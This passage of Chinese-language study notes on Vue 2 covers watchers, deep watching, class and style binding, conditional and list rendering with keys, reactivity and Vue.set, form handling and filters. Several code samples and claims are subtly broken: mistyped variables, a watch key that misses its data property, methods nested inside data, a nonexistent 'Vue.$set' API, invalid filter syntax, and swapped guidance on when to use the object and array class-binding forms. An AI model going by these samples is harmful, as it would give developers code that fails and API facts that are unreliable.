</script>
</body>
~~~

上面代码的watch也可以写为：

~~~JavaScript
Vm.$watch('isHot',{
    immediate:true, //初始化时让handler调用一下
    //handler什么时候调用?当isHot发生改变时。
    handler (newValue,oldValue){
        console.log('isHot被修改了',newValue ,oldValue)
    }
})
~~~

- watche总结：

  > 监视属性watch:
  >
  > 1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
  > 2. 监视的属性必须存在，才能进行监视! !
  > 3. 监视的两种写法:
  >    - new Vue时传入watch配置
  >    - 通过vm. $watch()监视

### 3. 深度监视

> Vue中的watch默认不监测对象内部值得改变。因为检测的是对象内的地址，当修改对象内的值时，对象的地址不会发生变化，从而Vue的watch属性会默认认为对象内部没有发生变化，就会导致我们检测失败。如果想要检测对象内部值的变化就要用到深度监测：配置`deep:true`可以监测对象内部值改变。
>
> 注意：监听的属性需要字符串形式，因为原本就是字符串的简写，但是此处特定要体现出来。如上面watch内的`isHot()`其应该写为`'isHot()'`。

**监视data中对象的一个数据**：

~~~html
<body>
    <!-- 准备好一个容器-->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click=" changeWeather">切换天气</button>
    </div>
</body>
<script type="text/javascript" >
    var vm = new Vue({
        el: "#root",
        data: {
            isHot: true,
            numbers:{
                a:1,
                b:2
            }
        },
        methods: {
            changeWeather() {
                this.isHot = !this.isHot
            }
        },
        computed: {
            info() {
                if (this.isHot) {
                    return "炎热"
                } else {
                    return "寒冷"
                }
            }
        },
        watch: {
            number:{
                deep:true,
                handler(){
                    console.log("1")
                }
            }
        }
    })
</script>
</body>
~~~

> 此时就可以监视data参数内`numbers`对象内部的值变化

- 深度监视总结：

  深度监视:

  1. Vue中的watch默认不监测对象内部值的改变(-层)。
  2. 配置deep:true可以监测对象内部值改变(多层)。

  备注:

  1. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以!
  2. 使用watch时根据数据的具体结构，决定是否采用深度监视。

### 4. 监视的简写形式

> 前提：不需要`immediate`和`deep`属性，函数当作handler方法写

~~~JavaScript
watch:{
    isHot(){
        ....
    }
}
~~~

或者为：

~~~JavaScript
vm.$watch("isHot", function(){
    ...
})
~~~

### 5. watch和computed属性对比

两者区别：

1. computed能完成的功能，watch都可以完成
2. watch能完成的，computed不一定能完成，例如：watch可以进行异步操作

两个小原则：

1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或者组件实例对象
2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数，Promise回调函数等），最好写成箭头函数，这样this的指向才是vm或者组件实例对象

## 八. Class、Style绑定与样式渲染

> 我们使用Vue的Class和Style可以更好的绑定样式，更有利于页面代码的维护。
>
> 操作元素的 class 列表和内联样式(Style)是数据绑定的一个常见需求。因为它们都是属性，所以我们可以用 `v-bind` 处理它们：只需要通过表达式计算出字符串结果即可。不过，字符串拼接麻烦且易错。因此，在将 `v-bind` 用于 `class` 和 `style` 时，Vue.js 做了专门的增强。表达式结果的类型除了字符串之外，还可以是对象或数组。

### 1. 绑定Class样式三种写法

> 给标签元素动态添加类名可以有三种写法：字符串赋值、数组赋值、对象赋值。

#### 11. 绑定Class样式字符串写法

> 字符串写法，适用于样式的类名不确定，需要动态指定。

~~~html
<!--这里假设Style标签中有：'happy'、'sad'、'normal'三种样式-->
<body>
    <div class= "basic" :class= "mood" @click=" changeMood" >{{name}}</div>
</body>
<script>
    Vue. config. productionTip = false
    new Vue({
        el: '#root',
        data:{
            name:'shi',	
            mood:'normal'
        },
        methods: {
            changeMood(){
                constarr=['happy','sad','normal']
                const index = Math.floor (Math.random( )*3)
                this.mood = arr[index]
            }
        },
    })
</script>
~~~

> 以上代码当我们点击div盒子后，Vue示例会通过点击事件，将`v-bind`(:后的内容)绑定的值修改为mood的值，然后传递给class。
>
> 当我们运行上面代码时：会随即向`basic`后追加一个style值。

#### 1.2. 绑定Class样式数组写法

> 适用于：要绑定的样式个数不确定、名字也不确定。

~~~html
<!--这里假设Style标签中有：'happy'、'sad'、'normal'三种样式-->
<body>
    <div class="basic" :class="classArr">{{name}}</div>
</body>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data:{
            name:'shi',	
            classArr:['atguigu1','atguigu2','atguigu3']
        },
    })
</script>
~~~

> 以上代码执行后class会同时拥有：`basic、atguigu1、atguigu2、atguigu3`三个类名

#### 1.3. 绑定Class样式对象写法

> 适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用。

~~~html
<body>
    <div class= "basic" :class= "classObj" >{{name}}</div>
</body>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data:{
            name:'shi',
            classObj:{
                atguigu1:false,
                atguigu2:false, 
            }
        },
    })
</script>
~~~

> 上面代码显示中class中的`atguigu1`和`atguigu2`都是false，表示不启用。改为true后，可以启用。

### 2. 绑定Style样式

> 我们可以在Style标签进行行内样式的动态书写。写法是：`v-bind:style=""`(:style="")。写法有两种：对象样式、数组样式。其中的**键名是央视对象**(名字与css中的键名书写格式要一致)。
>
> 这两种不常用，但要注意键名字母一定不要拼写错误，两个单词的第二个单词首字母要大写。和css格式差不多。案例如下：

~~~html
<body>
    <div class="basic" :style="sty1e0bj">{{name}}</div>
</body>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data:{
            name:'shi',
            sty1e0bj:{
                fontSize: '40px',
                color:'red',
                backgroundColor:'orange'
            }
        },
    })
</script>
~~~

- Class与Style绑定样式总结：

  绑定样式:
  1. class样式
  写法:class="xxx" Xxx可以是字符串、对象、数组。
  字符串写法适用于:类名不确定，要动态获取。
  对象写法适用于:要绑定多个样式，个数不确定，名字也不确定。
  数组写法适用于:要绑定多个样式，个数确定，名字也确定，但不确定用不用。
  2. style样式
  :style="{fontSize: xx}"其中xxx是动态值。
  :style="[a,b]"其中a、b是样式对象。

## 九. 页面渲染

> 页面渲染值得是，通过一些判断规则决定页面节点是否要显示。

### 1. 条件渲染

> 我们使用模板指令来进行条件渲染，用来显示或者隐藏标签节点。指令有两个：`v-show`、和`v-if`。

#### 1.1 v-show指令

> 该指令是一个类型为布尔值的表达式，用来判断是否隐藏标签。
>
> 如果表达式返回结果为true，则显示节点。如果为false，则将节点的`display`属性改为`none`。

示例：

~~~html
<body>
    <div id='root'>
        <!-- 使用v-show做条件渲染-->
        <h2 v-show="false">欢迎来到{{name}}</h2> 
        <h2 v-show="1 === 1">欢迎来到{{name}}</h2> 
    </div>
</body>
~~~

上面的代码第一个`h2`标签会隐藏，而第二个`h2`标签会显示

#### 1.2 v-if指令

> 该指令和`v-show`指令一样，同样用来判断节点是否被隐藏。不同的是当表达式返回的结果为false时，**节点会直接被删除**。

示例：

~~~html
<body>
    <div id='root'>
        <!-- 使用v- if做条件渲染-->
        <h2 v-if="false">欢迎来到{{name}}</h2> 
        <h2 v-if="1===1">欢迎来到{{name}}</h2> 
    </div>
</body>
~~~

同样，上面代码第一个节点会直接删除，第二个节点会正常显示。

#### 1.3 渲染案例

> 我们先准备一个按钮，在准备一个变量。点击按钮变量会+1。当变量等与一个值时，会先是对应标签

~~~html
<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</ button>
        <div v-show="n===1" >Angular</div>
        <div v-show="n===2">React</div>
        <div v-show="n===3">Vue</ div>
        <!--下面用v-if实现-->
        <div v-if="n===1" >Angular</div>
        <div v-if="n===2">React</div>
        <div v-if="n===3">Vue</ div>
    </div>
</body>
~~~

上面的`v-if`和`v-show`都可以实现显示或者隐藏节点，但不同的是`v-if`会直接将页面的节点删除。所以我们节点操作频率高的时候尽量用`v-show`，频率低时用`v-if`。

#### 1.4 v-else-if指令

> 该指令与JavaScript中的用法类似，但必须要配合`v-if`标签一起使用。

~~~html
<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</ button>
        <div v-if="n===1" >Angular</div>
        <div v-else-if="n===2">React</div>
        <div v-else-if="n===3">Vue</ div>
    </div>
</body>
~~~

上面代码是当n等于1时，后面的两个div不再执行。当第一个div标签结果为false时，再判断后面两个标签。其运行结果和上面的`v-if`运行一样。但其效率更高。

#### 1.5 v-else指令

> 该指令和JavaScript中的else一样。当前面的判断都不生效时，就输出else指令控制的标签。

~~~html
<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</ button>
        <div v-if="n===1" >Angular</div>
        <div v-else-if="n===2">React</div>
        <div v-else-if="n===3">Vue</ div>
        <div v-else>text</ div>
    </div>
</body>
~~~

上面代码是当`v-if`和`v-else-if`都判断为false时，执行`v-else`控制的标签。注意`v-if`、`v-else-if`和`v-else`一起做判断时，中间不要添加其他节点。如下：

~~~html
<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</ button>
        <div v-if="n===1" >Angular</div>
        <div v-else-if="n===2">React</div>
        <div>11</div>
        <div v-else-if="n===3">Vue</ div>
        <div v-else>text</ div>
    </div>
</body>
~~~

> 这段代码只能判断前两个div标签，后面的被`<div>11</div>`节点打断，节点无法进行解析，控制台报错

#### 1.6 v-if和template节点

> template节点为模板节点，可以把列表项放入template标签中，然后进行批量渲染，选然后template节点会消失，节点内的标签正常显示，好处是不改变页面标签结构。但要注意该节点只能和`v-if`标签配合使用。

~~~html
<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</ button>
        <!-- v-if与template的配合使用-->
        <template v-if="n ===1">
            <h2>你好</h2>
            <h2>shi</h2>
            <h2>北京</h2>
        </template>
    </div>
</body>
~~~

> 运行后页面没有`<template>`节点，直接显示三个`<h2>`节点。好处是不用再每个`h2`节点种写上判断。提高编码效率。

- 条件渲染总结：

  条件渲染:

  1. v-if
     写法：

     - v-if="表达式”
     - v-else-if="表达式"
     - v-else="表达式”

     适用于:切换频率较低的场景。
     特点:不展示的DOM元素直接被移除。
     注意: v-if可以和:v-else-if、v-else起使用， 但要求结构不能被“打断”。

  2. v-show 
  写法: v-show="表达式"
  适用于：切换频率较高的场景。
  特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
  3. 备注：使用v-if的时，元素可能无法获取到，而使用v-show 定可以获取到。

### 2. 列表渲染

> 用 v-for 指令基于一个**数组**来渲染一个列表。
>
> v-for 指令需要使用 **item in items** 形式的特殊语法，其中 items 是源数据数组。其用法和JavaScript的`for in`循环一致。
>
> 为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，需要为每项提供一个唯一 key属性。

#### 2.1 使用for..in遍历数组

> 可以在数组种定义几组对象，来进行遍历取值，放进容器中。但记得for...in循环指令中一定要绑定一个`key`值，用作每个节点的id。

~~~html
<body>
    <div>
        <h2>人员列表</h2>
        <ul>
            <li v-for="(p,index) of persons" :key="index">
                {{p.name}}-{{p.age}}
            </li>
        </ul>
    </div>
</body>
<script>
    Vue . config . productionTip = false
    new Vue({
        el: '#root',
        data:{
            persons:[
                {id:'001',name:'张三',age :18},
                {id:'002',name: '李四',age:19},
                {id:'003',name:'王五',age :20}
            ],
        }
    })
</script>
~~~

以上代码运行结果：

[for...in循环运行结果：](https://s1.ax1x.com/2022/04/26/LHXjDe.png)

​																			[<img src="https://s1.ax1x.com/2022/04/26/LHXjDe.png" alt="LHXjDe.png" style="zoom:50%;" />](https://imgtu.com/i/LHXjDe)

#### 2.2 使用for..in遍历对象

> for...in可以用于遍历对象，需要注意的是遍历对象时第一个接收的参数是对象的值，第二个参数是对象名。

~~~html
<body>
    <div>
        <h2>汽车信息</h2>
        <ul>
            <li v-for="(value,k) in car" :key="k">
                {{a}}--{{b}} 
            </li>
        </ul>
    </div>
</body>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data:{
            car:{
                name:'奥迪A8',
                price:'70万',
                color:'黑色'
            }
        })
</script>
~~~

运行结果：

[for...in遍历对象结果：](https://s1.ax1x.com/2022/04/26/LHxLvV.png)

​																[<img src="https://s1.ax1x.com/2022/04/26/LHxLvV.png" alt="LHxLvV.png" style="zoom: 50%;" />](https://imgtu.com/i/LHxLvV)

- 列表渲染总结：

  v-for指令:

  1. 用于展示列表数据
  2. 语法: v-for="(item, index) in xx" : key="yyy"
  3. 可遍历:数组、对象、字符串(用的很少)、指定次数(用的很少)

#### 2.3 ==for...in循环中key的作用==

> 当 Vue.js 用`v-for`正在更新已渲染过的元素列表时，它默认用“就地复用”策略。如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素。
>
> 此时会导致两个问题：
>
> 1. 效率低下
> 2. 索引值对比算法(diff算法)出错

- 问题引入：

  ~~~html
  <body>
      <!--准备好一个容器-->
      <div id="root">
          <!--遍历数组-->
          <h2>人员列表(遍历数组) </h2>
          <button @click . once=" add">添加一个老刘</ button>
          <ul> 
              <li v-for="(p,index) of persons" :key="index">
                  {{p.name}}-{{p.age}}
                  <inputr type="text"/>
              </li>
          </ul>
      </div>
  </body>
  <script>
      Vue.config.productionTip = false
      new Vue({
          el:'#root',
          data:{
              persons:[
                  {id:'001',name: '张三' ,age:18},
                  {id:'002',name:'李四',age:19},
                  {id:'003',name:'王五',age:20}
              ],
              methods: {
                  add(){
                      const p = {id:'004',name:'老刘',age :40}
                      this.persons.unshift(p)
                  }
              },
          })
  </script>
  ~~~

  以下问题导致的原因是`key`的值为index，如果将`key`的值改为`p.id`用对象里的唯一标识id就可以解决这个问题

  上面代码运行后在输入框内输入信息后点击按钮将`老王`节点添加到页面，此时就会出现问题：

  [key出现的问题：](https://s1.ax1x.com/2022/04/26/Lb9wRA.png)

​													[<img src="https://s1.ax1x.com/2022/04/26/Lb9wRA.png" alt="Lb9wRA.png" style="zoom:50%;" />](https://imgtu.com/i/Lb9wRA)

- key的分析

  > 可以没有值，默认为index值。当key用index做值时：

  [key分析图：](https://s1.ax1x.com/2022/04/26/Lbkb8g.png)                        [<img src="https://s1.ax1x.com/2022/04/26/Lbkb8g.png" alt="Lbkb8g.png" style="zoom: 50%;" />](https://imgtu.com/i/Lbkb8g)

  > 由上图我们观察到：
  >
  > 1. Vue先拿到data中的初始数据person中的值。
  > 2. 根据数据生成虚拟DOM，再将虚拟的DOM，在虚拟的DOM中节点有`key`值，这个值是给Vue后续做对比用的。之后会转换为真实DOM，取消`key`值。
  > 3. 之后我们向输入框内输出文字后，再点击按钮，会添加一个`老王`节点。
  > 4. 此时，Vue会生成新的实例，在这个实例中老王会被放在节点的最上面。
  > 5. 根据最新生成的数据生成新的虚拟DOM，在这个虚拟DOM中由于我们指定的`key`值为`index`值，所以`老王`节点的key值为0，之后依次递增。
  > 6. 这时，Vue会使用diff算法和之前旧的虚拟DOM进行数据对比，如果两个虚拟DOM中的数据一样，就会直接拿来用，当不一样时，就会将新的值替代旧的值。
  > 7. 因为我们在输入框中输入的数据实在真实DOM中体现的。所以Vue会将两个虚拟DOM中的`<input>`节点当作一样的数据进行输出。

  以下是用key的id做值：

  [key用id做值：](https://s1.ax1x.com/2022/04/26/LbEspD.png)                                  [<img src="https://s1.ax1x.com/2022/04/26/LbEspD.png" alt="LbEspD.png" style="zoom: 50%;" />](https://imgtu.com/i/LbEspD)

  > 以上是节点在前面加入，当我们把代码中的`this.persons.unshift(p)`改为`this.persons.push(p)`

- key作用总结

  > react、vue中的key有什么作用? ( key的内部原理)

  1. 虚拟DOM中key的作用:
     key是虚拟DOM对象的标识，当状态中的数据发生变化时，Vue会根据[新数据]生成[新的虚拟DOM]，随后Vue进行[新虚拟DOM]与[旧虚拟DOM]的差异比较，比较规则如下。

  2. 对比规则:
     (1) .旧虚拟DOM中找到了与新虚拟DOM相同的key:

     - 若虚拟DOM中内容没变，直接使用之前的真实DOM!
     - 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

     (2).旧虚拟DOM中未找到与新虚拟DOM相同的key

     - 创建新的真实DOM，随后渲染到到页面。

  3. 用index作 为key可能会引发的问题:
     (1). 若对数据进行:逆序添加、逆序删除等破坏顺序操作:

     - 会产生没有必要的真实DOM更新==>界面效果没问题，但效率低。

     (2). 如果结构中还包含输入类的DOM:

     - 会产生错误DOM更新==>界面有问题。

  4. 开发中如何选择key?：

     - 最好使用每条数据的唯一标识作为key,比如id、手机号、身份证号、学号等唯一值。
     - 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。
  
### 3. 列表过滤案例

> 我们需要准备一段数据，并在网页中实现模糊查询的效果。

- 监听属性实现代码如下：

  ~~~html
  <body>
      <div id= "root">
          <h2>人员列表</h2>
          < input type="text" placeholder="请输入名字"v-model="keyWord">
          <ul>
              <li v-for="(p,index) of filPerons" :key= "index">
                  {{p.name}}-{{p.age}}-{{p.sex}}
              </li>
          </ul>
      </div>
  </body>
  <script>
      //用watch实现
      new Vue({
          el:'#root',
          data:{
              keyWord:' ',
              persons:[
                  {id:'001',name:'马冬梅',age:19,sex:'女'},
                  {id:'002',name:'周冬雨',age:20,sex:'女'},
                  {id:'003',name:'周杰伦',age:21,sex:'男'},
                  {id:'004',name:'温兆伦',age:22, sex:'男'}
              ],
              filPerons:[]
          },
          watch:{
              keyWord:{
                  immediate: true, 
                  handler(val){
                      this.filPerons = this.persons.filter((p)=>{
                          return p.name.indexOf(val)!== -1
                      })
                  }
              }
          })
  </script>
  ~~~

  > 上面一段代码可以实习对`persons`中的数据进行模糊查询并展示在页面的效果。
  >
  > 其中`watch`中的代码是：监听与文本框绑定的keyword变量有没有改变，即当用户在用户框中输入信息时，keyword的值就会改变。如果改变监听函数就会对`persons`数组中的数据进行查询匹配，如果未匹配则返回结果`-1`，匹配成功返回数组下标。` this.persons.filter`会将返回的下标数组筛选出来传给`filePerons`数组，并在页面中列表中通过`v-for`遍历`filePerons`输出到页面。

- 这里也可以用计算属性写：

  ~~~html
  <body>
      <div id= "root">
          <h2>人员列表</h2>
          < input type="text" placeholder="请输入名字"v-model="keyWord">
          <ul>
              <li v-for="(p,index) of filPerons" :key= "index">
                  {{p.name}}-{{p.age}}-{{p.sex}}
              </li>
          </ul>
      </div>
  </body>
  <script>
      new Vue({
          el:'#root',
          data:{
              keyWord:'',
              persons:[
                  {id:'001',name:'马冬梅',age:19,sex:'女'},
                  {id:'002',name:'周冬雨',age:20,sex:'女'},
                  {id:'003',name:'周杰伦',age:21,sex:'男'},
                  {id:'004',name:'温兆伦',age:22, sex:'男'}
              ]
          },
          computed:{
              filPerons(){
                  return this.persons.filter((p)=>{
                      return p.name.indexOf(this.keyWord) !== -1
                  })
              }
          }
      })
  </script>
  ~~~

  > 使用计算属性较为简单，我们只需要关注`keyWord`变量，也就是只用关注用户的输入字符即可。

### 4. 列表排序案例

> 我们在上个案例中实现了模糊搜索数据的操作，这里我们再添加一个实现搜索后排序的功能。排序有升序、降序和原顺序。

~~~html
<body>
    <div id= "root">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord"/>
        <button @click="sortType=2">年龄升序</button>
        <button @click="sortType=1">年龄降序</button>
        <button @click="sortType=0">原顺序</button>
        <ul>
            <li v-for="(p,index) of filPerons" :key= "p.id">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
</body>
<script>
    new Vue({
        el:'#root',
        data:{
            keyWord:'',
            sortType:0, //0代表原顺序 1降序 2升序
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22, sex:'男'}
            ]
        },
        computed:{
            filPerons(){
                const arr=this.persons.filter((p)=>{
                    return p.name.indexOf(this.keyWord) !== -1
                })
                if(this.sortType){
                    arr.sort((p1,p2)=>{
                        return this. sortType === 1 ? p2.age-p1.age : p1.age-p2.age
                    })
                }
                return arr
            }
        }
    })
</script>
~~~

> 这个案例中我们只需要创建一个标记变量`sortType`用来判断变量值是否需要排序。再根据需求进行排序即可。

### 5. Vue检测数据的原理

> - 在对象中检测原理：
>
>   在Vue的设计中对对象的数据进行了一个递归，查找对象中的每一个属性，并且对其进行数据代理，给每一个属性设有`get`和`set`方法，这样子当对象中的数据发生改变，那么Vue就会察觉并修改页面中的数据
>
> - 在数组中检测原理：
>
>   通过包裹数组更新元素的方式实现，本质就是做了两件事：
>
>   1. 调整原生对应的方法对数组进行更新
>   2. 重新解构模型，进而更新页面
>
> 在修改数组的时候，我们只有通过数组的修改方法才能达到页面响应的效果。这是因为Vue将能改变原数组的的方法进行了包装，所以当我们调用这些方法才可以进行试图更新。修改方法有`push`、`pop`、`shift`、`unshift`、`splice`、`sort`、`reverse`。
>
> **在修改对象或者数组的时候，我们也可以用Vue给我们提供的`set`API来进行添加数据。**

**注意：Vue.set()和vm.set() 不能给vm或者vm的根数据对象添加属性(如：data、vm)**

#### 5.1 Vue的无法监听对象的情况

- 问题引入：

  ~~~html
  <body>
      <div id="root">            
          <button @click="updata">更新周冬雨的信息</button>
          <ul>
              <li v-for="p in persons" :key="p.id">
                  {{p.name}}---{{p.age}}
              </li>
          </ul>
      </div>
  </body>
  <script>
      var vm = new Vue({
          el:"#root",
          data:{
              persons:[
                  {id:"001", name:"周冬雨", age:19},
                  {id:"002", name:"周杰伦", age:30},
                  {id:"003", name:"夏雨", age:2},
                  {id:"004", name:"温兆伦", age:22}
              ]
          },
          methods: {
              updata(){
                  this.persons[0].name = "周老师"
                  this.persons[0].age = 40
              }
          }
      })
  </script>
  ~~~

  以上方法使用给数组属性赋值的方式可以实现页面数据变化。当我们点击页面按钮后显示数据就会改为下面的：

  [Vue监视页面原理：](https://s1.ax1x.com/2022/04/28/LXm9DU.png)

  ​																	[<img src="https://s1.ax1x.com/2022/04/28/LXm9DU.png" alt="LXm9DU.png" style="zoom:50%;" />](https://imgtu.com/i/LXm9DU)

- 但如下代码却不能完成修改页面数据的操作。

  ~~~html
  <body>
      <div id="root">            
          <button @click="updata">更新周冬雨的信息</button>
          <ul>
              <li v-for="p in persons" :key="p.id">
                  {{p.name}}---{{p.age}}
              </li>
          </ul>
      </div>
  </body>
  <script>
      var vm = new Vue({
          el:"#root",
          data:{
              persons:[
                  {id:"001", name:"周冬雨", age:19},
                  {id:"002", name:"周杰伦", age:30},
                  {id:"003", name:"夏雨", age:2},
                  {id:"004", name:"温兆伦", age:22}
              ]
          },
          methods: {
              updata(){
                 	this.persons[0] = {id:"001", name:"周老师", age:40}
              }
          }
      })
  </script>
  ~~~

  分批对一个对象的属性进行修改，这样产生的效果是对的，**但是我们修改一整条数据（对象），并没有产生我们预想中的效果**，但此时我们打开控制台去看到数据已经修改：

  [Vue监测数据控制台改变：](https://s1.ax1x.com/2022/04/28/LXmjde.png)

  ​                                        [<img src="https://s1.ax1x.com/2022/04/28/LXmjde.png" alt="LXmjde.png" style="zoom:50%;" />](https://imgtu.com/i/LXmjde)

  我们可以用如下方法进行修改：

  ~~~JavaScript
  this.persons.splice(0,1,{name:'周老师',age:50})
  ~~~

  这时我们再点击按钮就可以达到修改第一行数据的效果。

#### 5.2 Vue的两个setAPI

> 由于上面的赋值属性导致Vue无法做到监听页面的效果，这是由于属性的没有`setter`方法导致的，所以我们在给页面追加属性的时候可以使用Vue的两个API来达到给页面添加元素的同时追加`getter`和`setter`方法。该方法可以向响应式对象中添加一个属性。

~~~html
<body>
    <button @click="addSex">添加一个性别属性，默认值是男</button> 
    <h2> v-if="student.sex">性别：{{student.sex}}</h2> 
</body>
<script>
    const Vm = new Vue({
        el: '#root',
        data:{
            name:'shi',
            address:'北京',
            student:{
                name:'Tom',
                age:{
                    rAge:40,
                    sAge :29,
                },
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            addSex(){
                Vue.set(this.student,'sex','男')
            }
        }
    })
</script>
~~~

> 上面的`Vue.set(this.student,'sex','男')`代码用于在点击按钮后往页面添加一个性别的属性。如果不适用set方法，则Vue就无法做到页面监听，从而页面就不会有该项属性。
>
> 这里也可以写为：`Vue.$set(this.student,'sex','男')`
>
> 注意：set不能给Vue的data实例追加属性，只能给data内的对象或者数组追加。

## 十. 收集表单数据

> 我们之前的`v-model`指令可以做到收集用户输出框内信息的效果。但却不能收集用户选框内的数据。如下：

[from中选框收集不到数据：](https://s1.ax1x.com/2022/04/29/LvqDSA.png)

​													[<img src="https://s1.ax1x.com/2022/04/29/LvqDSA.png" alt="LvqDSA.png" style="zoom:50%;" />](https://imgtu.com/i/LvqDSA)

上图所示我们勾选了性别为女，但Vue示例绑定属性却显示为`null`。所以数据收集失败。解决办法就是给每个选框设置`value`值。勾选时，获取`value`值数据即可。

### 1. 收集用户信息完整代码：

~~~html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8"/>
        <title>收集表单数据</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <div id="root">
            <form @submit.prevent="demo1">
                <label for="demo">账号：</label>
                <input type="text" id="demo" v-model.trim="userInfo.account"><br/><br/>
                密码： <input type="password" v-model="userInfo.password"><br/><br/>
                年龄： <input type="number" v-model.number="userInfo.age"><br/><br/>
                性别：
                男<input type="radio" name="sex" value="male" v-model="userInfo.sex">
                女<input type="radio" name="sex" value="female" v-model="userInfo.sex"><br/><br/>
                爱好：
                学习<input type="checkbox" v-model="userInfo.hobby" value="study">
                打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
                听音乐<input type="checkbox" v-model="userInfo.hobby" value="music"><br/><br/>
                所属校区:
                <select v-model="userInfo.city">
                    <option value="">请选择校区</option>
                    <option value="beijing">北京</option>
                    <option value="shanghai">上海</option>
                    <option value="shenzhen">深圳</option>
                    <option value="guangzhou">广州</option>
                </select><br/><br/>
                其他信息：
                <textarea v-model.lazy="userInfo.other"></textarea><br/><br/>
                <input type="checkbox" v-model="userInfo.agree">阅读并接受 <a href="https://www.hnu.edu.cn/">《用户协议》</a><br/><br/>
                <button>提交</button>
            </form>
        </div>
    </body>

    <script type="text/javascript">
        Vue.config.productionTip = false

        const vm = new Vue({
            el:'#root',
            data:{
                userInfo:{
                    account:'',
                    password:'',
                    age:'',
                    sex:'',
                    hobby:[],
                    city:'',
                    other:'',
                    agree:'',
                },
            },
            //以JSON格式输出用户填写的信息。
            methods: {
                demo1(){
                    console.log(JSON.stringify(this.userInfo))
                }
            }
        })
    </script>
</html>
~~~

[表单数据收集成功：](https://s1.ax1x.com/2022/04/29/LvvkDI.png)										[<img src="https://s1.ax1x.com/2022/04/29/LvvkDI.png" alt="LvvkDI.png" style="zoom: 50%;" />](https://imgtu.com/i/LvvkDI)

### 2. v-model修饰符

|     修饰符     |                             描述                             |
| :------------: | :----------------------------------------------------------: |
|  v-model.lazy  | 使用lazy修饰符来进行限定。只有当用户的input中失去焦点或者用户点击回车按钮时，才会将后台的数据进行修改。 |
| v-model.number | 当用户在input中输入数字时，浏览器会默认将输入的数字转化为string类型，使用number修饰符来将输入的数字转为number类型。一般配合`input`中的`type='number'`使用 |
|  v-model.trim  | 用户可能输入的字符串中含有空格，这样系统在处理时可能会出现错误。使用trim修饰符来去掉字符串首部或者尾部的所有空格。 |

### 3. 总结

收集表单数据:
若：` <input type="text"/>`, 则v -model收集的是value值，用户输入的就是value值。
若： `<input type="radio"/>`, 则v-model收集的是value值，且要给标签配置value值。
若： `<input type="checkbox"/>`

1. 没有配置input的value属性，那么收集的就是checked(勾选or未勾选，是布尔值)
2. 配置input的value属性:
   - v-mode1的初始值是非数组，那么收集的就是checked (勾选or未勾选，是布尔值)
   - v-mode1的初始值是数组，那么收集的的就是value组成的数组

## 十一. 过滤器

> 功能：对要显示的数据进行特定格式化后再显示
> 注意：并没有改变原本的数据,是产生新的对应的数据。

### 1. 过滤器使用位置

> 过滤器可以用在两个地方：**双花括号插值和 `v-bind` 表达式** (后者从 2.1.0+ 开始支持)，用字符串`|`标识从这里开始是一个过滤器

~~~html
<!--在双花括号中-->
{{ rawId | filterformatId }}

<!--在v-bind中。v-bind可省略，以简写--> 
<div v-bind:id="rawId | filter formatId"></div> 
~~~

完整写法：

~~~html
<template>
    <div class="test">
        <div :id="rawId">{{rawId}}</div>
        <!--以下v-bind可省略，即v-bind:id可简写为:id -->
        <div v-bind:id="rawId |filter formatId">{{rawId | filter formatId}}</div>
    </div>
    </ template>
<script>
    export default {
        data() {
            return {
                rawId: 1
            };
        },
        filters: {
            filterformatId(value) {
                return value * 10; 
            }
        }
    };
</script>
~~~

[运行结果：](https://s1.ax1x.com/2022/04/29/Lxigv8.png)

​												[<img src="https://s1.ax1x.com/2022/04/29/Lxigv8.png" alt="Lxigv8.png" style="zoom: 50%;" />](https://imgtu.com/i/Lxigv8)

### 2. 全局过滤器、局部过滤器

- 全局过滤器，要用到`filter`方法，该方法接收两个参数：第一个参数是方法名，第二个参数是具体方法

  ~~~JavaScript
  Vue.filter('filteraddPricePrefix', function (value) {
    return "¥" + value;
  })
  ~~~

- 局部过滤器，我们正常再Vue实例中编写的filters叫局部方法，也叫局部过滤器

  ~~~html
  <template>
      <div class="test">
          <p>{{price}}</p>
          <p>{{price | filter_addPricePrefix}}</p>
      </div>
  </template>
  
  <script>
      export default {
          data() {
              return {
                  price: 100
              };
          },
          filters: {
              filter_addPricePrefix(value) {
                  return "¥" + value;
              }
          }
      };
  </script>
  
  <style lang="scss" scoped>
      .test {
          color: black;
      }
  </style>
  ~~~

### 3，过滤器中的参数

> 以下代码中，`filterA` 被定义为接收三个参数的过滤器函数。其中 `message` 的值作为第一个参数，普通字符串 `'arg1'` 作为第二个参数，表达式 `arg2` 的值作为第三个参数。

~~~javascript
{{ message | filterA('arg1', arg2) }}
